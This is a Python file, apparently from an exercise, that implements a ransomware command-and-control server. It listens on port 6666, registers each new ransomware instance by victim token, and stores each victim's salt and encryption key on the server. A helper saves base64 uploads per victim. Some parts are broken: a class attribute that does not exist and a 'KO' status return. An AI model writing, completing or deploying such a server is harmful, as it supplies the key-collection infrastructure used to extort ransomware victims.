import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

ROOT_PATH = "/root/CNC"

class CNC(CNCBase):

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance
        print()
        print(body)
        print()
        
        newPath = ROOT_PATH + "/" + str(body['token'])
        os.mkdir(newPath)

        with open(newPath+'/salt.bin', 'wb') as secrets:
            data = base64.b64decode(body['salt'])
            secrets.write(data)
        
        with open(newPath+'/key.bin', 'wb') as secrets:
            data = base64.b64decode(body['key'])
            secrets.write(data)

        return {"status":"KO"}

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()